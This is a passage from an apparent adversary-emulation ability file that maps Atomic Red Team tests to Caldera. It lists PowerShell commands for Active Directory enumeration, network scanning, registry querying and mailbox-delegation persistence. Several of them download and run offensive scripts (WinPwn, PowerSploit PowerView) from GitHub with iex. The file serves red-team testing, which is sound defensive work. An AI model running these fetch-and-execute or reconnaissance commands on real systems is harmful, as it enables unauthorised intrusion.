                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); powerSQL -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "57548b3eefc3c3d3eaf8c3b51380921a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "57548b3eefc3c3d3eaf8c3b51380921a"
    },
    "T1018__discovery__Remote System Discovery__f32d25602b6c142d321b9a0965316916": {
        "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-AdComputer -Filter *",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f32d25602b6c142d321b9a0965316916",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f32d25602b6c142d321b9a0965316916"
    },
    "T1082__discovery__System Information Discovery__b7e7e9eb804006a78cdd75940f7b7c3e": {
        "description": "Collect general computer informations via GeneralRecon function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Generalrecon -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b7e7e9eb804006a78cdd75940f7b7c3e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b7e7e9eb804006a78cdd75940f7b7c3e"
    },
    "T1069.001__discovery__Permission Groups Discovery: Local Groups__608e19b5f7e210ba73e207289e5a1314": {
        "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Recurse $env:TEMP\\SharpHound\\ -ErrorAction Ignore",
                    "command": "New-Item -Path \"$env:TEMP\\SharpHound\\\" -ItemType Directory > $null; & \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.exe\" -d \"$env:UserDnsDomain\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"$env:TEMP\\SharpHound\\\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "608e19b5f7e210ba73e207289e5a1314",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "608e19b5f7e210ba73e207289e5a1314"
    },
    "T1033__discovery__System Owner/User Discovery__221d4ebcb41e708b6ee90c1c0369a969": {
        "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path .\\CurrentUserObject.txt -Force",
                    "command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "221d4ebcb41e708b6ee90c1c0369a969",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "221d4ebcb41e708b6ee90c1c0369a969"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__196263c4c1f42138866d958193ad2ad4": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "196263c4c1f42138866d958193ad2ad4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "196263c4c1f42138866d958193ad2ad4"
    },
    "T1135__discovery__Network Share Discovery__7a87eec9166dd9d24825a4af7bb3bc47": {
        "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"};  ;  Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"; Invoke-ShareFinder -CheckShareAccess",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7a87eec9166dd9d24825a4af7bb3bc47",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7a87eec9166dd9d24825a4af7bb3bc47"
    },
    "T1033__discovery__System Owner/User Discovery__725f6e03f3e2098c4303861566f18894": {
        "description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path $env:temp\\rad*.tmp -Force",
                    "command": "$TokenSet = @{;   U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ';   N = [Char[]]'0123456789'; }; $Upper = Get-Random -Count 5 -InputObject $TokenSet.U; $Number = Get-Random -Count 5 -InputObject $TokenSet.N; $StringSet = $Upper + $Number; $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''; $file = \"rad\" + $rad + \".tmp\"; whoami.exe /all >> $env:temp\\$file",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "725f6e03f3e2098c4303861566f18894",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "725f6e03f3e2098c4303861566f18894"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__b45cb08e24877077d98421393bce079a": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b45cb08e24877077d98421393bce079a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b45cb08e24877077d98421393bce079a"
    },
    "T1012__discovery__Query Registry__691d489fe77afbfe8646419fce6759fd": {
        "description": "Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1012",
            "name": "Query Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" ; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "691d489fe77afbfe8646419fce6759fd",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "691d489fe77afbfe8646419fce6759fd"
    },
    "T1018__discovery__Remote System Discovery__c75a55384a1e7026bb91f841e4ca2ba9": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c75a55384a1e7026bb91f841e4ca2ba9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c75a55384a1e7026bb91f841e4ca2ba9"
    },
    "T1049__discovery__System Network Connections Discovery__8ed60dceb98746f1da6214f4f6af7164": {
        "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1049",
            "name": "System Network Connections Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-NetTCPConnection",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8ed60dceb98746f1da6214f4f6af7164",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8ed60dceb98746f1da6214f4f6af7164"
    },
    "T1083__discovery__File and Directory Discovery__abc280f400f218aa1f4d5efe3c9e8228": {
        "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe\"; Start-Sleep -Second 4; Stop-Process -Name \"DirLister\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "abc280f400f218aa1f4d5efe3c9e8228",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "abc280f400f218aa1f4d5efe3c9e8228"
    },
    "T1082__discovery__System Information Discovery__009e7a7118b5a182b2a5b65150e5cc6f": {
        "description": "Powersploits privesc checks using oldchecks function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "rm -force -recurse .\\DomainRecon -ErrorAction Ignore; rm -force -recurse .\\Exploitation -ErrorAction Ignore; rm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore; rm -force -recurse .\\LocalRecon -ErrorAction Ignore; rm -force -recurse .\\Vulnerabilities -ErrorAction Ignore",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); oldchecks -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "009e7a7118b5a182b2a5b65150e5cc6f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "009e7a7118b5a182b2a5b65150e5cc6f"
    },
    "T1120__discovery__Peripheral Device Discovery__7b9c7afaefa59aab759b49af0d699ac1": {
        "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1120",
            "name": "Peripheral Device Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\T1120_collection.txt -ErrorAction Ignore",
                    "command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt; $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7b9c7afaefa59aab759b49af0d699ac1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7b9c7afaefa59aab759b49af0d699ac1"
    },
    "T1046__discovery__Network Service Discovery__45aa13ed61bbe98aaf9324ce8044c860": {
        "description": "Scan ports to check for listening ports for the local host 127.0.0.1",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "nmap 127.0.0.1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "45aa13ed61bbe98aaf9324ce8044c860",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "45aa13ed61bbe98aaf9324ce8044c860"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__3f588ff884129699e1b9a56f2248bc3b": {
        "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-ADPrincipalGroupMembership $env:USERNAME | select name",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3f588ff884129699e1b9a56f2248bc3b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3f588ff884129699e1b9a56f2248bc3b"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__0a96ef5851da1be487cebdd9a1f86b7a": {
        "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0a96ef5851da1be487cebdd9a1f86b7a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0a96ef5851da1be487cebdd9a1f86b7a"
    },
    "T1046__discovery__Network Service Discovery__65e9fb2b4c023de2a2a73de5cc58ce7f": {
        "description": "Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's \"primary\" IPv4 address first and then scans that address with a /24 netmask.\nThe connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$ipAddr = \"\"; if ($ipAddr -eq \"\") {;     $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1;     Write-Host \"[i] Using Interface $interface\";     $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress; }; Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"; $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1); Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"; $ports = 445, 3389; $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }; foreach ($ip in $subnetIPs) {;     foreach ($port in $ports) {;       try {;           $tcp = New-Object Net.Sockets.TcpClient;           $tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null;       } catch {};       if ($tcp.Connected) {;           $tcp.Close();           Write-Host \"Port $port is open on $ip\";       };     }; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "65e9fb2b4c023de2a2a73de5cc58ce7f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "65e9fb2b4c023de2a2a73de5cc58ce7f"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__10a0f4f8efdae71f3e88b3e20560798a": {
        "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; }; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "10a0f4f8efdae71f3e88b3e20560798a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "10a0f4f8efdae71f3e88b3e20560798a"
    },
    "T1082__discovery__System Information Discovery__566b2f5743d88edb44ad1d9d450e921c": {
        "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); RBCD-Check -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "566b2f5743d88edb44ad1d9d450e921c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "566b2f5743d88edb44ad1d9d450e921c"
    },
    "T1098.002__persistence__Account Manipulation: Additional Email Delegate Permissions__8f2c53299c608f1c5168dfda3561de50": {
        "description": "Give a nominated user, full mailbox delegation access of another user.\nThis can be used by an adversary to maintain persistent access to a target's mailbox in M365.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098.002",
            "name": "Account Manipulation: Additional Email Delegate Permissions"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Import-Module ExchangeOnlineManagement; $secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test@contoso.com\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Remove-MailboxPermission -Identity \"delegate@contoso.com\" -User \"operator@contoso.com\" -AccessRights FullAccess -InheritanceType All -Confirm:$false; Disconnect-ExchangeOnline -Confirm:$false",
                    "command": "Import-Module ExchangeOnlineManagement; $secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test@contoso.com\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Add-MailboxPermission -Identity \"delegate@contoso.com\" -User \"operator@contoso.com\" -AccessRights FullAccess -InheritanceType All; Disconnect-ExchangeOnline -Confirm:$false",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8f2c53299c608f1c5168dfda3561de50",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8f2c53299c608f1c5168dfda3561de50"
    },
    "T1098__persistence__Account Manipulation__8aabc61664e947c69058c3df4f3af860": {
        "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong-special\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong-special\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong-special\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }",
                    "parsers": {
